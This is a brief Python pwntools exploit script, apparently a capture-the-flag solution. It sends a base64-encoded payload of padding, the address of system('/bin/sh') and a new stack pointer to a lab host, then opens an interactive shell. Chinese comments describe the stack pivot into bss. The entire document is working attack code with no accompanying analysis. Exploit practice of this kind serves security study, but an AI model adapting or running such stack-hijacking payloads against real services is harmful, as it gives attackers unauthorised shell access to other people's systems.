#!/usr/bin/python
#coding:utf-8

from pwn import *
from base64 import *

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote("172.17.0.2", 10001)

payload = "aaaa"				#padding
payload += p32(0x08049284)		#system("/bin/sh")地址，整个payload被复制到bss上，栈劫持后retn时栈顶在这里
payload += p32(0x0811eb40)		#新的esp地址
io.sendline(b64encode(payload))
io.interactive()
